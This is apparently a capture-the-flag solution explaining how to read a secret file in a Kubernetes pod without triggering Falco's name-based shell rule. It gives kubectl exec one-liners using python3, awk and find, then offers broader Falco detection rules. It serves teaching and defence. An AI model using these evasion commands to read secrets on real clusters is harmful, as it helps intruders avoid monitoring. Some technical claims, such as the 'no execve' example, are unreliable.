# Solution — Runtime Evasion

## The Vulnerability

Falco's default ruleset detects shells by **process name**, not by syscall behavior. The key rule:

```yaml
- rule: Terminal shell in container
  condition: >
    evt.type = execve and
    container.id != host and
    proc.name in (sh, bash, zsh, dash, ksh, tcsh, csh) and
    ...
```

This means: if you use a process whose name is **not** in that list to execute commands, Falco stays silent.

## Attack Technique

```bash
# This triggers Falco (proc.name = sh):
kubectl exec -n dojo-sec-evasion red-team-pod -- sh -c 'cat /secret/flag'

# This does NOT trigger the default rule (proc.name = python3):
kubectl exec -n dojo-sec-evasion red-team-pod -- python3 -c "print(open('/secret/flag').read())"
```

The flag:
```
KUBE{falco_rules_have_blind_spots}
```

## Other Evasion Techniques

```bash
# Using awk (proc.name = awk)
kubectl exec -n dojo-sec-evasion red-team-pod -- awk 'BEGIN{while((getline line < "/secret/flag") > 0) print line}' /dev/null

# Using find -exec (proc.name = find, then cat)
kubectl exec -n dojo-sec-evasion red-team-pod -- find /secret -name flag -exec cat {} \;

# Reading via /proc/self/fd (no execve at all — pure file read)
kubectl exec -n dojo-sec-evasion red-team-pod -- python3 -c "
import os
fd = os.open('/secret/flag', os.O_RDONLY)
print(os.read(fd, 100).decode())
os.close(fd)
"
```

## Why This Works

Falco's name-based approach has three fundamental blind spots:

1. **Non-standard interpreters**: `python3`, `perl`, `ruby`, `node`, `lua`, `R` — all can execute code
2. **Built-in file operations**: Many binaries read files without spawning a child shell
3. **Direct syscalls**: Code that uses `open(2)` + `read(2)` directly never creates a process Falco can name-match

## Blue Team Defense

**Immediate fix** — extend the Falco rule to cover all interpreters:

```yaml
- rule: Code execution in container
  condition: >
    evt.type = execve and
    container.id != host and
    proc.name in (sh, bash, zsh, dash, python3, python, perl, ruby, node, lua, awk, gawk, mawk) and
    not proc.pname in (runc, containerd-shim)
  output: "Code execution in container (proc=%proc.name user=%user.name container=%container.name)"
  priority: WARNING
```

**Better fix** — use eBPF-based detection that fires on the **syscall**, not the process name:

```yaml
- rule: Sensitive file read in container
  condition: >
    open_read and
    container.id != host and
    fd.name startswith /secret and
    not proc.name in (pause)
  output: "Sensitive file read (file=%fd.name proc=%proc.name)"
  priority: WARNING
```

This catches **any** process reading `/secret/*` — Python, awk, or a custom binary.

**Production hardening**:
- Use Falco with the `syscall` driver (eBPF) not just the userspace driver
- Regularly audit `rules.d/` against MITRE T1059 (Command and Scripting Interpreter)
- Correlate Falco alerts with audit logs — look for `kubectl exec` → `open()` syscall sequences
